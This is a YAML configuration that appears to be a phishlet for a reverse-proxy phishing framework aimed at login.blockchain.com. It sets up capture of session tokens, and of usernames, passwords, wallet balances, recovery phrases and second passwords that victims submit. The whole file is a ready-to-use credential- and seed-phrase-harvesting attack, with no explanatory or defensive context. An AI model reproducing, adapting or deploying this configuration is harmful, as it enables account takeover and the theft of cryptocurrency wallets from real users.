auth_tokens:
  - domain: 'login.blockchain.com'
    keys: ['.*,regexp']
auth_urls:
  - '/home'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'session'
      search: '(.*)'
      type: 'post'
    - key: 'balance'
      search: '(.*)'
      type: 'post'
    - key: 'recovery_phrases'
      search: '"recovery_phrases":"([^"]*)'
      type: 'json'
    - key: 'two_password'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.blockchain.com'
  path: '#/login'
  
